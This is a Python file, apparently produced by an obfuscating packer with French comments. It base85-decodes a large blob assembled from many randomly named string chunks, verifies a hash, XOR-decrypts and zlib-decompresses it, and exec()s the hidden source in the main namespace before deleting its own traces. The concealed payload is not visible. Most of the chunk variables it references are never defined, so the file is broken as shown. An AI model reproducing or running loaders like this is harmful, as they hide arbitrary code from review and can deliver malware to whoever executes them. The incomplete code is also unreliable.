_czEAc5SOhN7F_7 = '{)8;gyokacpoPz65-`9Da{NjTd6hsdgO7MzwE8jxQ9'
_cthYO6QwfNw2Pr = 'tQ}jq;w_R21@f>aqvxUg%Jm+fE`4^53(?xbXATu7tb'
_ctCH0ILkC_k8g5 = '60UV-msx3778vg)EKrI_8Z@R9mVMw%7%Q_m*`WpOn%'
_ci7u9Yzh3d30if = 'S5JLE*z|3Zqkg=w33F$0GAq#Hf@>5-mXg6I6u9U!B-'
_cp1XW_EBIXXOxn = 'QB-HTCvx;*9CCxNgGe^@0zzbXG2pL6=}abwK_vrana'
_c_r8fqCrLuO6r7 = '#Hvm|VA{Z$@6FJr2S2r&J!S<g6ewY%Tcw_o=mKx=;i'
_cerL8q1Urfleir = 'W*bv{gC||<9YlVBgnN<0etrYk3Um$p~Y8^V*s7hTJJ'
_cx2fAZmfqY1Xdf = 'HaZojHhY$!O*YLzF%`xXD2<j94QGku=`ynAFt*cT^4'
_cszJvlBS20RINl = 'OMoR7fCC(n*GXr;Lr<x%5%jCV&Z_qkf{u;@_KC7Ev0'
_ciR7RmIx_r9N2x = 'JdHqAx|OGP0S$Fak#!tI;eo2*ttNNq+eH=JAQs0?k<'
_cz_BrtIic5XvKp = '*v&SNi?c<%fNJ9s^n89Kyxe{UkV#YEG<BpDArj2&xV'
_cwzqIzmBFCGUMS = 'J}lrmPT*$&D;0s0|-JE^3}^R@SrEmC+Zb+W-<2h1Y2'
_cs02wpQwA92G0v = 't%id#QfsDN)jX3odYGxFjFMzOfcY{K!BTL8$CqDR4W'
_coHoXOMQslV72p = 'B`%Mw!+d%<Yq4T!4OwWiPmJf>a|*lx8&>XP1Kw}pYP'
_cuOpKEV2iJwMH5 = '|M<jzCq}M;~rs)6aCgBx&V~Qj8JIoOg0<q*|<emgF`'
_cq6LzPTpnZENiN = 'PZ*+)z*`8F|*TXAqTraPY>5JdN$LEjJnt`OiAf)xIy'
_cyzVdyWX7KuaRJ = '7tOk$BSvp^-CQC*&}8Fl7FT5y*@dH82U!ZDBG{<mA0'
_cyJ9TNeLVqT9Q5 = '8|vC1n^YGQ=H+f*G{V*a-RDx!<sNSN~TzDKY@sMr1a'
_ccQFTIz3z3Di5U = 'r_uA%Kb~R-k*yJ2D|G>eKr|yW8F4(3(ew#Nj_=I#{A'
_ctCUr1uyc_ARuh = 'iNR_88U)e*uyb9)#CevNBQV7x83Ys%vkEiM<&hEDG{'
_ckyEsjTzAinbQ1 = '0nReFY6K{>DVh%d8LtJ?@hg+%-jG<2Q7wJ~Toew+yY'
_ccDYMdCyt7UJX6 = 'AaG{g>aQxfO}<(OTUAc=3^I3=4q?|>%mA?>J5)Vu`h'
_cphYZkicN5_jvp = 'z5=xC--X?0Uk?&)bA{m+kTYp98Fcm2;RYEZ5H?}FiM'
_cwlKDzSwuRKpSF = 'K29q^w$k{3YdeBdWU;Y$8UpQ8!SHkQb0mThY4y49D7'
_cn0fML9ThYxQnD = '^FYribZ#b#Vc{IrD?N_H%{Mql~ixueNb&'

_pg0rrx8gloEIA1 = __import__('base64').b85decode(_cz5SdaUkxulnQL + _cltQ8teGL8Wqfd + _c_LGgXLLqZRwri + _ckA9td4nXjOAkT + _clhfXt6vSMupGs + _cv83u4CLSoatmR + _ceGt8Zh2Z3xB3E + _cyMyt_hHoDe8Hs + _ceS8x8K7YUzD8R + _cb8KVcj4CZolRn + _cqtc1co_yX37Nh + _cuIY8GtJcuj9ad + _cuvErxxFjKvxXi + _cfB6uumXrgSnm8 + _czzrr9Pl9KV1Ue + _cfzCY6K59XYBGd + _c_yFhr5P1cOlYu + _ciZhLpg06F1Hf4 + _chtG53RoxxH13g + _cjz8ANUZqnDn53 + _cmw1d0FkjFhq2k + _czFkBrs9FKntm5 + _cb55pL3_2WOZuI + _cyc6uh8xwItjzw + _cgVMHGkWLrjnIl + _covSr01Chd7oxL + _cnSq_y1hHkeSpZ + _carECupq8kjJVV + _cfYsZkQpxqRSz6 + _cmMg1iNS2iqfZW + _cyP3kADYe8gHiF + _czbvmOyxgjoUts + _cqR3NX7WnO39AN + _cssRDI7MNgjjr8 + _coD0YYbYJf9qUF + _cnja39zp_yHrLF + _cj6PqSSMmjblK5 + _cw7ek6gP7Sisc9 + _cdVEMY1L4plurU + _cumly1hHSSXvhe + _cq8WOvXvkE7rD1 + _ctPceqEyefrJp4 + _cnDsFAiygrizAm + _csgIFSjvlIV2Tp + _cfODpFq6EbrFlE + _cq5MVvq5Wroz4O + _ctlUb_WpYi2Erf + _c_gm0tHJ_qy9nA + _cypqwgiqMmee3P + _ct4PZeJNwI6fFA + _cteZiYgUvKR8eZ + _cmdC29kcP3faT2 + _ceSpFP675puDqi + _chZrh9MEEPHsuq + _ccHCk5IfLW2lhr + _clmgXAf00xgi4i + _c_IfIRfQ6nXCav + _ckjzKTl_fjL3tH + _cyT9RtjJnmowqO + _crg56lOjWJtSt6 + _cbP4IJiPQqACt0 + _cxPIHyOIlEDTPS + _cao1AJSgVUSrip + _cxW1m_VUfYw6qx + _cpZzziWnv0D96z + _cjn3ehTdUw4954 + _cqXBk8CUr8ZZHF + _clmuwOftpTQoeG + _cqoA0YmcSr8okD + _cdiSSSDaKaDdz_ + _cms5XtBr5vLDRl + _cha63EHpCmvgWF + _cj1PGjk7GYCTcf + _cra8TdzxMNzVxH + _cfcupjhkU0a01s + _czuL1SfmcB5mdn + _cmg_icFqHSjamb + _ctzJTu3AQfmG3U + _cd1pe6VE9vz7lg + _ciEwFIWamBDf9v + _cySOgB82MKLFBa + _cwFYPqb9SWqtWv + _cnklZndJNk3BLg + _ctCZM37STU5OIy + _c_d5J8o62yF7mL + _cigLAAIOD_TXAa + _cmOQzavB8peQbk + _cu31AmlWHeQiiQ + _cbv9nPOaqP2YhI + _c_BQ4yvmleZLu_ + _ca2Srqf0hB7tHD + _csSVV9mYuJtWKH + _cpXzy9Y3zXP9ku + _cqnMuzo6YE_AyB + _cdG_hJeCiDinkt + _cvhw7JyFbxsNYH + _cvZcKPUtt6pgMA + _ccwn57dPVfWa5w + _cqzExG87LCoJNt + _ci3yub6SaaMsJf + _ctNpaM5OHFzwAY + _cfXTmfZZXhyBj_ + _cxM84rdDZKLD1r + _ce_ZjzAftHz3IA + _cy6ht2SErSrwpT + _cg8mynAhJ_NLHu + _cfymPveqyiBu7U + _ct2PCbY0KWrhGW + _czl0KJTOQlrmEo + _caMGmEKhDFIInB + _coV37QpJZeU09h + _ckQdIWKPcTPWr7 + _c_pcwFyGue0LQ0 + _cdjB2uFl3p98C6 + _c_j3fvpgY8C0AR + _ckYu0aFTwkYWoX + _co0HkkyHWMNNN9 + _cpW1MbN7O3JlDA + _chOo55JOAEWQd4 + _cp6efmRsKnCUSW + _clxnBqVRwFZSMB + _clyih44llBVBrJ + _cuYTLhatx7tIwW + _cuHh4ermQHFv2C + _cmtq6BQWWYyOPx + _cki0Gm4_Fuy2Pc + _crcVgglYw16oNu + _cx70G5CmAI9Rb4 + _ct70MJHHMrNZAZ + _cohU86uZOaFoNa + _cy4WcM4XpacaL0 + _czItRvWlliCtPm + _cyBrXef2XiIQ6L + _cos5Wgipn_utLx + _cpj5BZliDp3R9F + _cgdVFruqV8V5EE + _cpNtIgAuV13_mo + _cu7IidYZcUgDSp + _cwQ1cxpR8h5wqD + _camxyNFlD2jRan + _ccw9YU9NtcLfSl + _cvWyejS9vNS6qm + _ceuvz1MNhoPT0q + _cnU_QjZUQqhHHb + _ccSWdD4mr90Tc9 + _czUUxOfpNqwCzT + _cxKRRnp74F9Afv + _cdRlPbmLHck3Q6 + _caDymHUtWtj6sQ + _ciL0L_SSsttDrO + _czlr85OWua2w6z + _cj9PJnpkvrZcUr + _cthSd3jEMxawxr + _cbT2NJzCMVLe63 + _cg4WomiKCsxu8R + _ceoyH71z8D88D0 + _cr_SpUEZDj1PYT + _coTv1Er429lRl8 + _czYY8fqNh6E0lI + _c_quAL_2J_VvV3 + _ccincl809d_aiM + _clEEpNigu7wvtd + _czbD1_IaOG0kLp + _cnJoYRGF0k4AaG + _czCI_ohXMGyKlc + _c_JWhFfpT7agdd + _civtvAlz6E2bOF + _cnxI4Wt_gio5kp + _c_RnS_xFQgn9H7 + _coWRVQzUf05Pv7 + _cySobEzgQ5euWZ + _chGyDCmiwfcbAL + _czjQHrD5iNt1jK + _cvLKbAEFJ6TRY4 + _cdMkLOTed9eidM + _cbYonMtmOSCNla + _cdoDjrtVpcAasu + _cfvkn35t51uTZY + _cmx5EE30z5WlXF + _cd2S3N6DliXcqU + _cx3eS7aCrR6DG7 + _cvQ8KyFy0KlCJi + _cr1yV9K7RYByu6 + _cnEyx37un3rZQU + _cq_USHiVy4eJ7e + _cclNBhF4BYIETh + _czJpaZV2E82mKN + _c_W9gQKfjDj6vH + _cklnL5js4SyGwu + _ceO914w5S8qxxz + _ccRb67WswXw7Df + _c_I2wOFv3uZOMg + _cufDPHxKHDbc_C + _ca8rhYq2SgA9DG + _ckFGQ1U_nHC13V + _cdUg1Q88QGc3ul + _cerHLKlpKkx0t1 + _ckDK0gQBhEs04T + _cim1F7B5sIIlUX + _crMDbV2PcaLjqe + _c_ErF3p41hu5kB + _cqVbQkNroFER6J + _cc35mBRgkDHckd + _cf3zGfUOAMwOWK + _cxvABjGJ9m1WKV + _cpZ8V17FISY_wU + _ci9WWXUOJPAcuh + _cenSOIppQoePDx + _cuulGQQf3zKNP9 + _cljZ46J3IIc0rq + _cx4QRiWynZgcxY + _chEJ0rzbPveHh8 + _crGpKIGkX6O6Rj + _cs6VCLy8bJTJbN + _ckz7RM2xFXEofV + _cfpyJxo5tw2MIE + _crhuPwWBlwxkId + _cn5srn_IFLfnX4 + _ch3LJPUut0DTDR + _cepyBEMTup6Rse + _cza0Fd8QUQQRUJ + _cprTlNLij4R9RW + _cnQCjnQ7i7ncIh + _c_z6_VcyLeGBEh + _cgz7naajpkm71p + _cohrOF9upavgoX + _cnu9fT7rzh6kFg + _cmFd5FTHfr6dsV + _csbxnQh0HBic5y + _cusUY37PY6YypO + _cgZGu6gDAnbtYR + _cbTtcm0cxdjCES + _ckq4aXDkoPFkqu + _cqTCIXcZtqVuQ9 + _chn8QhdOrW06Qo + _ccE3duCa7MS3Fq + _cryNlksYR8S0BE + _czEAc5SOhN7F_7 + _cthYO6QwfNw2Pr + _ctCH0ILkC_k8g5 + _ci7u9Yzh3d30if + _cp1XW_EBIXXOxn + _c_r8fqCrLuO6r7 + _cerL8q1Urfleir + _cx2fAZmfqY1Xdf + _cszJvlBS20RINl + _ciR7RmIx_r9N2x + _cz_BrtIic5XvKp + _cwzqIzmBFCGUMS + _cs02wpQwA92G0v + _coHoXOMQslV72p + _cuOpKEV2iJwMH5 + _cq6LzPTpnZENiN + _cyzVdyWX7KuaRJ + _cyJ9TNeLVqT9Q5 + _ccQFTIz3z3Di5U + _ctCUr1uyc_ARuh + _ckyEsjTzAinbQ1 + _ccDYMdCyt7UJX6 + _cphYZkicN5_jvp + _cwlKDzSwuRKpSF + _cn0fML9ThYxQnD)
if __import__('hashlib').sha256(_pg0rrx8gloEIA1).hexdigest() != 'b1a9e15baf7a660b170b5ef54d3be99373763cf220accb2d75853b09dc4f6b86':
    __import__('sys').exit(1)
_xwZWgPYdQq6aMK = bytes([76, 13, 117, 126, 22, 164, 125, 48, 214, 14])
_fksEvfzNsjiTk6L = bytes([155, 193, 127, 249, 43, 248, 33, 93, 212, 132])

def _fxsAAblsorXp3K0(_bjXYYNPyt_C6uu, _khAiV4GlWJBY2Y):
    return bytes(_bjXYYNPyt_C6uu[_iu4dTTdHrmY_FV] ^ _khAiV4GlWJBY2Y[_iu4dTTdHrmY_FV % len(_khAiV4GlWJBY2Y)] for _iu4dTTdHrmY_FV in range(len(_bjXYYNPyt_C6uu)))

def _fd_tyVTzJCadjiG(_trkBUQSK1NVi1Q):
    import zlib
    return zlib.decompress(_trkBUQSK1NVi1Q) # Un seul niveau de zlib ici pour simplifier

def _feo2TwLYywRo4vu():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xne8FjahVni0eY = _fxsAAblsorXp3K0(_pg0rrx8gloEIA1, _xwZWgPYdQq6aMK)
    # 2. Décompression Zlib
    _dqnYzvNovuUaOm = _fd_tyVTzJCadjiG(_xne8FjahVni0eY)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dqnYzvNovuUaOm.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nubHkI2gon5MNL = _main.__dict__
    _nubHkI2gon5MNL.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nubHkI2gon5MNL)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feo2TwLYywRo4vu()
try:
    del _fxsAAblsorXp3K0, _fd_tyVTzJCadjiG, _feo2TwLYywRo4vu
    del _pg0rrx8gloEIA1, _xwZWgPYdQq6aMK, _fksEvfzNsjiTk6L
except:
    pass
